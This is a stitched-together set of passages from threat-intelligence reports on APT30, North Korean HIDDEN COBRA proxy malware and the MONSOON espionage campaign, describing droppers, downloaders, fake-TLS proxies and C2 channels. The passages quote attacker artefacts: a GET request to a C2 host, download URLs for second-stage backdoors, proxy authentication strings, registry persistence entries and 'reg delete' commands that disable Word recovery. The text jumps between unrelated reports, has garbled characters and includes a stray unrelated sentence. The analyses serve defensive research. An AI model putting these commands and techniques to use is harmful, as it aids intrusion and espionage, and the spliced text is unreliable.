CREAMSICLE. The document creates the file firefox.exe (MILKMAID) and a non- malicious decoy document ( Wor.doc) in the user™s %TEMP% directory, executes firefox.exe, and displays the non-malicious document. MILKMAID extracts a compressed PE ( readme.lz) from its resource section, decompresses it, and writes it to %APPDATA%\\\\Norton360\\\\Engine\\\\5.1.0.29 as wssfmgr.exe (CREAMSICLE). MILKMAID creates the shortcut file Symantec LiveUpdate.lnk in the user™s Startup folder (%USERPROFILE%\\\\Start Menu\\\\Programs\\\\Startup) with the target path %APPDATA%\\\\Norton360\\\\Engine\\\\5.1.0.29\\\\ccSvcHst.exe (%APPDATA% is expanded). Finally, MILKMAID launches CREAMSICLE (wssfmgr.exe).CREAMSICLE attempts to download an encoded executable from a specified location using the following HTTP request:GET /stactivex/update1.htm HTTP/1.1User-Agent: Microsoft Internet ExplorerHost: www.creammemory.comCache-Control: no-cacheThe downloaded file is decoded, written to disk as %APPDATA%\\\\Norton360\\\\Engine\\\\5.1.0.29\\\\ccSvcHst.exe, and padded with 51,200,000 null bytes. CREAMSICLE does not appear to execute the downloaded file, presumably relying on Windows to do so (using the shortcut file in the user™s Startup folder) the next time the user logs in.BACKBEND and GEMCUTTER Downloaders BACKBEND and GEMCUTTER are older downloaders that have been previously used by APT30. BACKBEND BACKBEND is a secondary downloader used as a backup mechanism in the case the primary backdoor is removed. The BACKBEND sample af504e86416c5f643e96f6e5e69566f0 was compiled on 16 August 2007. When executed, BACKBEND checks for the presence of the mutexes MicrosoftZj or MicrosoftZjBak (both associated with BACKSPACE variants). If either of the mutexes exist, the malware exits. 59If BACKBEND is not running from the C:\\\\Program Files\\\\Internet Explore folder as iexplore.exe, it creates the folder and copies itself as iexplore.exe to that location.Next, if the current execution path of the malware process is not <CSIDL_STARTUP>\\\\Update.exe, 53 it copies itself to that location to achieve persistence. Finally, BACKBEND starts the C:\\\\Program Files\\\\Internet Explore\\\\iexplore.exe process by providing the current path of the malware as the first command line parameter. If the malware process executable file path is C:\\\\Program Files\\\\Internet Explore\\\\iexplore.exe, BACKSPACE deletes the file given by the first command line parameter passed in. Then, the malware downloads a file from hxxp://www.cbkjdxf.com/04-1/04-1.htm and saves it under Windows directory as netsvc.exe. 54 BACKSPACE starts a new process using the full path of the downloaded file (%windir%\\\\netsvc.exe) and deletes <CSIDL_STARTUP>\\\\Update.exe.GEMCUTTERGEMCUTTER is used in a similar capacity as BACKBEND, but maintains persistence by creating a Windows registry run key. The GEMCUTTER sample bf8616bbed6d804a3dea09b230c2ab0c was compiled on 15 February, 2009. The malware starts by creating MicrosoftGMMExit and MicrosoftGMMHaveExit as non-signaled events. GEMCUTTER then queries for the registry value HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\GetMM\\\\pid. If the value does not exist, the malware sets the registry value to the encoded malware process filename (each filename character incremented by one). GEMCUTTER checks for the presence of the mutex MicrosoftGMMZJ to ensure only one copy of GEMCUTTER is executing. If the mutex doesn\\'t exist, the malware creates it and continues execution; otherwise, the malware signals the MicrosoftGMMExit event. The malware performs cleanup by deleting the registry value with the same name as the malware filename under the HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run registry key and the file with the same name as the malware itself in the %sysdir% directory. If GEMCUTTER is not running from %sysdir% as CTFM0N.xxx (the file extension is excluded in the check), the malware copies itself to that location. The malware then starts a new process by providing %sysdir%\\\\CTFM0N.exe as the executable file path, and the current process exits. If GEMCUTTER is running from %sysdir% as CTFM0N.xxx, the malware creates a new registry value under HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run, with the value and data set to CTFM0N.EXE. The registry value HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\GetMM\\\\pid is set to the DUGN1O/fyf (CTFM0N.EXE with each character incremented by 1). GEMCUTTER checks for the existence of the mutex MicrosoftZj (associated with BACKSPACE). If the mutex doesn\\'t exist, GEMCUTTER downloads a file from hxxp://www.lisword.com/HM/Update.htm and saves it under %windir% as netsvc.exe. A new process is started using %windir%\\\\netsvc.exe55 as the executable file path. 60APPENDIX B MD5 HASHESBelow are md5 hash values for a representative sample of APT30 malware.

Given several hundred malware samples, the compile dates show a fairly regular distribution over the years 2005 Œ present. In addition, registration dates for the earliest known APT30 domains also support origins dating back to the same time frame. 2We were able to verify that each file™s icon type (Adobe or Word) was consistent with the letter used (p or w). Although we were only able to identify one malicious document used to deploy a ZRLnk variant (md5 hash d2661543c3c456f5fafdd97e31aaff17), the document type (an RTF file, typically opened by Microsoft Word) was also consistent with the version convention. 3We did not have conclusive data to interpret the meaning of the last character ‚N™ and ‚Y™, present in some samples. Some evidence suggests that it may represent the inclusion or exclusion of additional malware features, such as the ability to bypass personal firewalls; this appears to be true for at least one variant of BACKSPACE (ﬁZj Listenﬂ). 4The use of mutexes and events also supports version control, ensuring that the newer version of the malware executed during the self-update process replaces the previous version. 5See Appendix A for a detailed description of BACKSPACE malware. 6While the controller software refers to itself as ﬁNetEagle,ﬂ it is used to manage backdoor clients for the malware we call BACKSPACE (also known as ﬁLecnaﬂ). The malware we call NETEAGLE uses a different set of commands and is not compatible with the ﬁNetEagleﬂ controller. In an attempt to avoid confusion, we will refer to the controller as the ﬁBACKSPACE controller,ﬂ since it is used to manage BACKSPACE clients. 7This aligns with early BACKSPACE compile dates of 2005. 8BACKSPACE samples with md5 hash values acb2ba25ef225d820ac8a5923b746cb8 and c90f798ccfbedb4bbe6c4568e0f05b68 are two examples. 9Additional paths with slight variations have also been observed in FLASHFLOOD, such as %WINDIR%\\\\$NtUninstallKB885884$.10A controller that could be freely copied and distributed would erode the market for future custom software purchases. 11See Appendix for detailed analysis of both BACKSPACE and NETEAGLE. 12For example, the BACKSPACE B and Y commands; see Appendix for details. 13See Appendix for detailed analysis.14http://www.asean.org/asean/about-asean 15http://www.asean.org/news/item/eighteenth-asean-summit-jakarta-7-8-may-2011 16http://www.asean.org/news/asean-statement-communiques/item/joint-statement-the-seventh-asean-plus-three-labour- ministers-meeting-7th-almm3-phnom-penh-11-may-2012 17http://maritimesecurity.asia/free-2/asean-2/asean-china-talk-on-east-sea/ 18http://www.aseanindia.com/summit-2012/ 19http://en.wikipedia.org/wiki/List_of_Secretaries-General_of_the_Association_of_Southeast_Asian_Nations 20http://www.asean.org/news/asean-secretariat-news/item/asean-today-2 21For the ﬁZJ Listenﬂ variants, the ﬁYﬂ vs. ﬁNﬂ in the version number appears to differentiate between variants that attempt to bypass certain host-based firewalls by generating mouse-click events on dialog box buttons. The ﬁYﬂ variants include this feature; the ﬁNﬂ variants do not. 6822The paths %WINDIR%\\\\$NtUninstallKB900727$ and %WINDIR%\\\\$NtUninstallKB885884$ are used by some variants of the FLASHFLOOD malware, one of three components believed to be used to steal data from air-gapped networks. 23Two outliers were compiled in May 2011; those samples also used the aseanm.com C2 domain and may have been created to target the 18th ASEAN Summit.24CSIDL (constant special item ID list) values are used to identify frequently used folders that may not have the same path on different Windows systems. CSIDL_TEMPLATES corresponds to the folder used to store document templates; for example, C:\\\\Documents and Settings\\\\<username>\\\\Templates. See https://msdn.microsoft.com/en-us/desktop/ bb762494%28v=vs.85%29.aspx for additional detail. 25The threat actor can provide a target IP address or hostname with the ‚(‚ command. 26Most ﬁZJ Listenﬂ samples were compiled on December 31, 2012 and share similar version numbers with the ﬁZJ Linkﬂ samples from April 2013 (e.g., version strings containing Lan2.2Lnk for ﬁZJ Listenﬂ and F2.2Lnk or F2.3Lnk for ﬁZJ Linkﬂ). 27http://www.mfa.gov.bt/wp-content/uploads/2013/08/press-release11.pdf 28Shear, Michael. ﬁWhite House Urges China to Act on Journalists™ Visasﬂ. Jan 30, 2014. http://www.nytimes. com/2014/01/31/world/asia/white-house-urges-china-to-act-on-journalists-visas.html 29BACKSPACE is also known as ﬁLecnaﬂ and may be detected by security vendors by either name Œ e.g., Backdoor.APT.Lecna. 30Comparison is generalized; individual samples may vary. 31The hex representation of each ASCII character is incremented by one. ‚M™ (0x4D) becomes ‚N™ (0x4E), ‚.™ (0x2E) becomes ‚/™ (0x2F), etc.32https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx 33Analysis of other BACKSPACE variants suggests that the firewall bypass features may be a modular capability that can be compiled into different versions at will. Preliminary analysis suggests that version numbers for some BACKSPACE variants may include a ﬁYﬂ or an ﬁNﬂ to indicate the presence or absence of this feature. 34Version information is the OSVERSIONINFO struct data returned by a call to GetVersionEx. 35Analysis of other versions of BACKSPACE showed that Port3 may be used for an interactive remote command shell, but that function was not supported in sample 6ee35da59f92f71e757d4d5b964ecf00 .36https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx 37Due to limited availability of products localized for languages like Thai, Tagalog, or others used in the Southeast Asia region, English and Chinese would likely be the most common versions used by organizations in that area. 38The ‚W™ is overwritten by the malware version string. The version string is 5 bytes including the NULL character. It appears the beacon was intended to have a 4 byte version string. When copying the 2.18\\\\x00, the last \\\\x00 overwrites the ‚W™ character. 39Persistence may be provided by other files used to retrieve or install NETEAGLE; for example, the MILKMAID/ ORANGEADE droppers create a shortcut file to establish persistence for a second-stage file downloaded by their CREAMSICLE payloads. 40It is possible that this behavior is configured within the binary at compile time, or has been otherwise modified in this version. 41SHIPSHAPE determines the disk size by TotalNumberOfBytes returned from GetDiskFreeSpace. The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota. 6942Because the copied executables are external to the SHIPSHAPE malware, their content or purpose is unknown. FireEye believes that SHIPSHAPE may be used to copy tools such as SPACESHIP, which could then be transferred (via the removable drive) to another victim computer. 43The sample f18be055fae2490221c926e2ad55ab11, described here, targets folders and .doc/.docx files, although the sample b249bcf741e076f11b6c9553f6104f16 contains icons for a much broader range of file types within its resource section. 44These are believed to be directories used by other pieces of the malware ecosystem. The SPACESHIP sample analyzed below references both the \\\\msdn\\\\ and \\\\Recycled\\\\ directories on a removable drive; the FLASHFLOOD sample references \\\\$LDDATA$\\\\ and \\\\Recycled\\\\.45Info.txt is used as a log file where information associated with scanning and file information is kept. 46Likely an updated configuration file. Note the missing \\\\ in the directory path between FoxPro and ld.ini.)47The purpose of this activity is unclear. SENS (the System Event Notification Service) can be used to support mobile computers or computers on high-latency networks. See https://msdn.microsoft.com/en-us/library/windows/desktop/ cc185680%28v=vs.85%29.aspx. 48See https://msdn.microsoft.com/en-us/library/ms629649%28v=vs.85%29.aspx. 49See https://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx. 50FLASHFLOOD determines the disk size using the TotalNumberOfBytes returned from GetDiskFreeSpace. The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota. 51Presumably files in these directories were already archived, e.g., when copied to the drive by SPACESHIP. 52The file ﬁChina MFA Press Briefing 29October 2012.docﬂ ( md5 hash f054c0f8c5b4c2a5eb30a16ebe09d8d0 ) is an example of an exploit document that drops ORANGEADE and the DLL variant of CREAMSICLE. 53<CSIDL_STARTUP> is a file system directory that corresponds to the user\\'s Startup program group; for example, C:\\\\Documents and Settings\\\\user\\\\Start Menu\\\\Programs\\\\Startup under Windows XP or C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup under Vista/Windows 7. 54Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutexes are not found on the victim host.55Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutex is not found on the victim host.

Summary Description This Malware Analysis Report (MAR) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. Government partners, DHS and FBI iden tified Trojan malware variants used by th e North Korean government - referred to by the U.S. Go vernment as BADCALL. The U.S. Government refers to malicious cyber activity by th e North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visi t https://www.us-cert.gov /hiddencobra. FBI has high confidence that HIDDE N COBRA actors are using malware variants in conjunction with proxy servers to maintain a pre sence on victim networks and to further net work exploitation. DHS and FBI are distributing this MAR to enable network defense and reduce exposure to North Korean government malicious cyber activity. This MAR includes malware descriptions re lated to HIDDEN COBRA, suggested response actions and recommended mitigation technique s. Users or administrators should flag activity associated with the malware, report the ac tivity to the DHS Na tional Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give the activity the highest priority for enha nced mitigation. This report provides analysis of three (3) malicious executable files. The first two (2) files are 32-bit Windows executables t hat function as proxy servers and implement a \"Fake TLS\" method similar to the behavior described in a previously published NCCIC report, MAR-10135536-B. The third file is an Android Pa ckage Kit (APK) file designed to run on Android platforms as a fully functioning Remote Access Tool (RAT).

Analysis in dicates this application is designed to force a compromised syst em to function as a proxy server. When executed, the malware binds and listens for incoming connections on port 8000 of the compromised syste m. The proxy session traffic is protect ed by way of a simple cipher based on rotati ng XOR and ADD. The cypher will XOR each byte sent with 47h and added by 28h. Each byte received by the malware will be XOR™ed by 47h and subtract ed by 28h. See Screens hots 1, 2 & 3 for c ode examples. Notably, this malware attempts to disable the Window s firewall before binding to port 8000 by modifying the followin g registry key: --Begin Firewall Reg Key Modified- -SYSTEM\\\\CurrentControlSet\\\\Ser vices\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfileGloballyOpenPorts\\\\\\\\List --End Firewall Reg Key Modified- -Analysis of this malware indicates it is designed to turn a vict im host into a \"hop point\" by relaying traffic to a remote syst em. When the adversary initially connects to a victim™s machine via port 8000, t hey must first authenticate (over a session secured with the XOR/ADD cipher described above) by providing the ASCII string \"1qazXSDC23weﬂ. If the malware does not receive this value, it will terminate th e session, responding with the value \"m*^&^ghfge4werﬂ. If the operator authentic ates successfully, they can then is sue the command \"ghfghjuyufgdgftr\" which instructs the malware to b egin TLP:WHITE US-CERT MAR-10135536-G 3 of 13 TLP:WHITE functioning as a proxy server and respond to the operator with the value \"q45tyu6hgvhi7^%$sdfﬂ. Next, the malware attempts to create a proxy session between the o perator and another server. During this process, the malware will attempt to authenticate with the d estination server by sending the value \"ghfghjuyufgdgftr\" as a challenge. To complete the authentication sequence, the malware expects to receive a response value of \"q45tyu6hgvhi7^%$sdf\". All challenge & respon se traffic is encoded using the ADD/XOR cipher described earlier . Importantly, the connecti on from this proxy malware to the target proxy sys tem will begin via a \"fake TLS\" connection attempt, similar to the behavior described in a previously released NCCIC report, MAR-1 0135536-B. Essentially, the malware initiates the TLS session us ing one of several public SSL certificates obtained from well known, legitima te internet services and imbedded in the malware. The malware begins a TLS session with the proxy target by issuing calls to the Op enSSL functions SSL_new(), SSL_set_fd, and SSL_connect(). The malwa re then sends and receives initial data (authenticati on values) to and from the target proxy sy stem using the OpenSSL functions SSL_rea d() and SSL_write(). However, the malware never completes the TLS hands hake, instead decoding the data u pon receipt using the XOR/ADD c ipher described earlier. See Figures 1-4 for code examples of this process. The following is a list of the domains for which the malware co ntains public SSL certificates, used for initiating the \"FAKE TLS\" sessions: --Begin SSL cert list - - myservice.xbox.com uk.yahoo.com web.whatsapp.com www.apple.com www.baidu.com www.bing.com www.bitcoin.org www.comodo.com www.debian.org www.dropbox.com www.facebook.com www.github.com www.google.com www.lenovo.com www.microsoft.com www.paypal.com www.tumblr.com www.twitter.com www.wetransfer.com www.wikipedia.org -- End SSL cert list-- Screenshots Figure 1 TLP:WHITE US-CERT MAR-10135536-G 4 of 13 TLP:WHITE Operator providing command to authenticate with proxy malware.

Static analysis i ndicates this application is very similar in structure and functi on to C6F78AD187C365D117CACBEE140F6230. However, rather than being a PE32 executable this application is a Windows 32-bit DLL, which must be loaded by an external loader. This external loader was not included within this submission. This DLL is designed to force a compromised system to act as a proxy server. This implant is designed to proxy network traffic from an operator to another software tool that is being operated by the ad versary on a remote system. The traffic to and from this prox y server will be protected with the same simple XOR / ADD cipher us ed by the malware C6F78A D187C365D117CACBEE140F6230. Analysis of this malware indicates it is designed to bind to and listen for incoming connections on port 443 of a victim™s syst em after disabling the firewall by modifying the following registry key: --Begin Firewall Reg Key Modified- -SYSTEM\\\\CurrentControlSet\\\\Ser vices\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfileGloballyOpenPorts\\\\\\\\List --End Firewall Reg Key Modified- -Importantly, analysis indicates this proxy malware expects the inco ming system to try to establish a \"fake TLS connection\" as d escribed in earlier analysis. Static analysis indicates t he OpenSSL library is used to implement this TLS/SSL session in such a way to ensu re the SSL session fails. For example, the malware at tempts to call the OpenSSL function SSL_CTX_us e_certificate_file() with the file netc onf.dll as the SSL certificate to use (see Figure 5). This application does not drop such a file, therefore this call is likely to fail. Simil arly, the malware makes a call to SSL_CTX_use_ProvateKey_file(), de signating the file wbemhost.dll as the authent ication certificate. This is most lik ely done intentionally to insure the call will fail. After connecting to this malware via port 443, the operator must issue the challenge va lue \"qwertyuiop\" to authenticate with th e implant. This malware also has the added capability of allowing an operator to co llect information about the comp romised system. This informa tion is collected using the Windows APIs GetComputerNa meW, gethostbyname, and GetAdaptersInfo. In order to use this feature, the operat or must issue the instruction value \"ghfghju yufgdgftrﬂ after authentic ating. As with C6F78AD187C365D117CACBEE140F6230, this malwar e uses the OpenSLL functions ssl_read() and ssl_write() to exchange dat a with the operator, however the malware uses a simple SUB /XOR cipher (as earlier described) to decrypt incoming traffic, indi cating the operator is aware the traffic will not be encrypted v ia SSL. Analysis indicates this malware must also authenticate with the destination server to which the operator wishes to proxy traffi c. To do so, this malware first sends that remote server the challenge value \" 1qazXSDC23we.\" The malware must then receive the following response from the destination server before it will allow the operator to prox y traffic to it: \"m*^&^ghfge4werﬂ (see Figure 7). The authentic ation values sent to and from this proxy server will be protected via same XOR / A DD cipher utilized by the malware C6F78AD187C365D117CACBEE140F6230 . The following is a list of the domains for which the malware co ntains public SSL certificates, used for initiating the \"FAKE TLS\" sessions: --Begin SSL cert list- -myservice.xbox.com uk.yahoo.com web.whatsapp.com www.apple.com www.baidu.com www.bing.com www.bitcoin.org TLP:WHITE US-CERT MAR-10135536-G 9 of 13 TLP:WHITE www.comodo.com www.debian.org www.dropbox.com www.facebook.com www.github.com www.google.com www.lenovo.com www.microsoft.com www.paypal.com www.tumblr.com www.twitter.com www.wetransfer.com www.wikipedia.org --End SSL cert list-- Screenshots Figure 5 Abnormal calls to SSL_CTX_use_certificate_ file() and SSL_CTX_use_PrivateKey_file().

Revision: 1 .0 7 | TLP - WHITE | 4 / 57 EXECUTIVE SUMMARY MONSOON is the name given to the Forcepoint Security investigation into an ongoing espionag e campaign that the Special Investigations team have been tracking and analysing since May 2016. The overarching campaign appears to target both Chinese nationals within different industries and government agencies in Southern Asia. It appears to have sta rted in December 2015 and is still ongoing as of July 2016. Amongst the e vidence gathered during th e MONSOON investigation were a number of indicators which make it highly probable 1 that this adversar y and the OPERATION HANGOVER 1 , 2 adve rsary are one and the same. These indicator include t he use of the same i nfrastructure for the attacks , similar Tactics, Techniques and Procedures (TTPs), the targeting of demographically similar victims and operati ng geographically within the Indian S ubcontinent . The malware components used in MONSOON are typically distributed through weaponised documents sent through e - mail to specifically chosen targets. Themes of these documents are usually political in nature an d taken from recent publications on topical current affairs. Several malware components have been used in this operation including Unknown Logger Public , TINYTYPHON , BADNEWS , and an AutoIt 3 backdoor. BADNEWS is particular ly interesting, containing resilient command - and - control (C&C) capability using RSS feeds, Github, forums, blogs and Dynamic DNS hosts . This whitepaper provides an in - depth understanding and insight into the actors and their campaign. It includes detail ed analysis and findings , previously undocumented malware components, victims, and infrastructure involved. ACKNOWLEDGEMENTS We would like to acknowledge both Kaspersky and Cymmetria 4 who have published their own research on the groups referred to as \"PATCH WORK\" and \"DROPPER ELEPHANT\". We also recognise the analysis by Blue Coat in tracking OPERATION HANGOVER in the past 1 . We would like to thank the wider Forcepoint Security Labs team for their help with our investigation. We would also like to give special thanks to Ran Mosessco for assisting with specific analysis. 1 - 32 h ttps://www.gov.uk/government/uploads/system/uploads/attachment_data/file/311572/20110830_jdp2_00_ed3_with_change1.pdf mation is always better than less. When people know the reason things are happening, even if it\\'s bad news , they can adjust their expectations and react accordingly. Keeping people in the dark only serves to stir negative .

Virus Total 2 (VT) Intelligence queries are often constructed in order to hunt for new, unusual and interesting malware as part of the routine work p erformed by the Special Investigations team. The initial discovery of MONSOON stemmed from one of these queries. During such activities, an RTF document was identified that warranted further investigation. Cyber Crime Bill. A specific document was si ngled - out for analysis via VT for number of reasons . These included: a l ow detection rate , a l ow number of submissions , an interesting set of default languages including US English, Saudi Arabic and PRC Chinese, that it e xploited a known vulnerability ( CV E - 2015 - 1641 5 ) and that it had filename s with p olitical themes including Word - Telecommunications Policy - and \"Cyber_Crime_bill.doc\" 3 : This document was opened in a virtualised lab environment and was seen to drop malware. By analysing this malware is was possible to determine that it was not of a known or documented ma lware family. It contained interesting functionality that warranted further investigation ( see below) . T his malware was named b y Special Investigations as BADNEWS after its ability to use news sites and blogs to obtain its C&C address. Pivoting by Author. By exploiting the document information found in the original malicious RTF , the name of the user who last modified the docume nt was identified: 2 https://www.virustotal.com / 3 https://www.virustotal.com/en/file/34cdfc67942060ba30c1b9ac1db9bd042f0f8e487b805b8a3e1935b4d2508db6/analy s is/ PRELIM INARY (1) This Act may be called the Prevention of Electronic Crimes Act, 2015.

O ne of the samples used genuine content from the Na tional Institute for Defence Studies Japan document NIDS Ch ina Security Report 2016 4 . The specific filename used for this sample was \"china_report_EN_web_2016_A01.doc\" . Using Google to search for this specific filename returned three hits. Two of the results were for VT and another for a report on URLQuery.net. One of the VT results showed that the file was provided from a web server located on a host on IP address 37.58.60.195 and that it had also provided a number of other, similar files 5 . The other VT results referred to the analysis of the malicious file 6 .

The final Google search result was a report generated by the URLQuery.net site: Figure 7 URLQuery.net The site t.ymlp50. com  is a legitimate web and e - mail marketing service . It is owned and operated by the Belgian company Your Mailing List Provider (YML P). Further Google search es of other document names revealed similar redirection chains using the same service. Consequently, it is reasonable to conclude that a number of weaponised documents were delivered using YMLP.

Several document types and document exploits have been used in the MONSOON campaign to deliver various malware components. It is reasonable to suggest that the actors are using a malicious document builder to qui ckly weaponise legitimate documents. T he following vulnerabilities have been identified within the attackers\\' documents: Vulnerability Description CVE - 2012 - 0158 Microsoft BizTalk Server Windows Common Controls (MSCOMCTL.OCX) Bug Lets Remote Users Execute Arbitrary Code CVE - 2014 - 6352 Microsoft Windows CVE - 2014 - 6352 OLE Package Manager Remote Code Execution Vulnerability CVE - 2015 - 1641 Microsoft Office Memory Errors Let Remote Users Execute Arbitrary Code and Input Validation Flaw Permits Cross - Site Script ing Attacks Figure 14 Exploited CVEs Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 17 / 57 BADNEWS Weaponised Documents . The BADNEWS malware is typically packaged into a malicious document via an encrypted binary blob within th at document. This binary blob often contains a legit imate decoy doc ument that is shown to the user. On other occasions the decoy document is downloaded directly . CVE - 2015 - 1641 has been observed as being exploited to drop BADNEWS. When the document exploit is triggered, the shellcode will drop the binary bl ob into the user\\'s %temp% folder along with an encoded VBScript: Figure 15 Binary Blob Dropped to %temp% The encoded VBScript uses a file extension which is not associated, by default, as being a VBScript file. The extensions . domx and . lgx have been observed . The shellcode is responsible for adding a new file association for the file extension which specifies that they should be interpreted as an encoded VBScript. Finally, the shellcode executes the encoded VBScript file which will extract the encrypted files from the binary blob, show the decoy document (if there is one), and execute the malware. The VBScript hard - coded sizes of the files to extract from the binary blob: Figure 16 VB Extract of Blob Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 18 / 57 The decryption routine uses the encryption key \"ludos 7 to decrypt 32 - byte chunks of the embedded files: Figure 17 VB Decryption of Embedded Files Our analysis of BADNEWS can be found later in this document Page: 22  7 http://starw ars.wikia.com/wiki/Ludos Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 19 / 57 AutoIt Backdoor & Unknown Logger Weaponised Documents . The majority of weaponised documents drop an AutoIt backdoor . D ocument s exploiting CVE - 2014 - 6352 have been observed installing the malware via the following INF: Version Sig nature = \"$CHICAGO$\" class=61883 ClasGuid={2E87RBCD - 7488 - 12T1 - QYXX - 74521ACV1AS4} DriverVer=0/21/2006,61.7600.16385 DestinationDirs DefaultDestDir = 1 DefaultInstall AddReg = RxStart RxStart HKLM,Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ RunOnce,Inst all,,%1% \\\\ sysvolinfo.exe The malware executable name varies.

A full analysis of the AutoIt backdoor can be found later in this document Page: 30  . M alware known as Unknown Logger has also been dropped by the same sort of weaponised document. A full analysis of Unknown Logger can also be found later in this document Page: 37  . TINYTYPHON Weaponised Documents . A third malware used in MONSOON is a small backdoor based on publicly available code from the MyDoom 6 worm. This malware will crawl mapped drives for documents and upload them to its C&C. We have seen this dropped by an RTF exploiting CVE - 2012 - 0158 under the name \"DPP_INDIA_2016.doc\" 8 . The document contains shellcode which drops a file under %t emp% \\\\ svchost.exe and then attempts to disable Word\\'s recovery features via the following commands: cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 14.0 \\\\ Word \\\\ Resiliency\" /F cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 12.0 \\\\ Word \\\\ Resiliency\" /F The svchost.exe 9 dropped by the document executes an embedded, base64 encoded malware component that we have named \" TINYTYPHON \".

It was therefore not possible to analyse the pages served. However, it was possible to browse to lite.php on newsnstat. com  . The content of this page always remained the same over the duration of the investigation.

Th e code profiles whether a system has Microsoft Silverlight installed. The site then requests lite.php?name= where the value of name is \\'true\\' or \\'false\\' depending on whether Silverlight is installed and accessible or not. No further content was served fro m lite.php during the investigation. A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document. This could have been intended as an exploitation of something like CVE - 2016 - 0034 which is known to have been adopted by exploit kits back in February 2016 and which pre - dates MONSOON.

The name was given due to its use o f RSS feeds, forums, blogs and D y na mic DNS providers for its C&C infrastructure. BADNEWS uses a DLL side - loading technique with a signed Java binary in order to evade security solutions. It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour. DLL Side - Loading . The BADNEWS DLL is typicall y side - loaded into a legitimate signed Java executable. A specific weaponised document analysed 10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll Mic roScMgmt.exe is a renamed version of the legitimate Java Runtime\\'s 6.0.390.4 binary named java - rmi.exe and is signed by Sun Microsystems. This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll . However, the jli.dll here contains the BADNEWS malware. When MicroScMgmt.exe is executed, it will load up the malicious jli.dll and ultimately call the JLI_WildcardExpandClasspath_0 export in the DLL. At this point the BADNEWS code will take over and begin performing its malicious routines. This technique is a stealth tactic to evade anti - malware solutions which are notoriously weak at detecting side - loaded malware. The malware will spawn 2 threads, one to perform key - logging and one to crawl the local hard - drives for document fil es. Persistence . BADNEWS installs a registry key under HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run in order to remain persistent on the system. Figure 20 Windows Registry Keys 10 SHA1: 11064dcef 86ac1d94c170b24215854efb8aad542 Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 23 / 57 C&C Channels . BADNEWS is ty pically built with several hard - coded channels which it can use to obtain commands or change its C&C. These C&C channels include RSS feeds, Github, forums, blogs and Dynamic DNS hosts. In the sample analysed, the malware had several hard - coded C&C channels although some were corrupted and did not work correctly: hxxp://feeds.rapidfeeds.com/81913/ hxxps://raw.githubusercontent.com/azeemkhan89/cartoon/master/cart.xml hxxp://www.webrss.com/createfeed.phpfeedid=47448 hxxp://www.webrss.com/createfeed.phpfeedid=4 7449 hxxp://www.chinasmack.com/2016/digest/chinese - tourist - bit - by - snake - in - thailand.html hxxp://www.travelhoneymoon.wordpress.com/2016/03/30/tips - to - how - to - feel - happy hxxp://overthemontains.weebly.com/trekking - lovers hxxp://tariqj.crabdance.com/tesla/ghsnl s.php hxxp://javedtar.chickenkiller.com/tesla/ghsnls.php hxxp://asatar.ignorelist.com/tesla/ghsnls.php The first 7 C&Cs are referred to by the malware as either a \"blog\" or a \"feed\". These channels are only used to tell the malware where its real C&C is. T he last 3 Dynamic DNS channels are back - up C&Cs in case it is not able to obtain a C&C address from one of the blogs or feeds. The Dynamic DNS back - up C&Cs typically use the same filename but the directory name changes for different builds of the malware. The directory may indicate a campaign identifier or a code - word for the target victim of the malware. We have seen the following directories used: tesla Tussmal Mussmal quantum yumhong Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 24 / 57 When a C&C is obtained from a blog or feed, it is extra cted from the page by searching for \"{{\" in the content. A GitHub example 11 is below: Figure 21 GitHub Command Channel A nother example taken from a comment by a user called \"Zubaid 12 \" posted on chinasmack  .com  : Figure 22 Chinasmack.com Command Channel 11 https://github .com/azeemkhan89/ 12 https://en.wikipedia.org/wiki/Zubaid Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 25 / 57 And a final example taken from forum.china.org.cn: Figure 23 F orum Command Channel The content after \"{{\" is the C&C address which is encrypted in the same manner as described below.

Once BADNEWS has decided which C&C address to communicate with it will send off some system informat ion and await a command to execute. A unique identifier is computed for the victim which is based on the tick count from the victim machine when the malware was executed. This ID is saved in the file \" %temp% \\\\ T89.dat \".

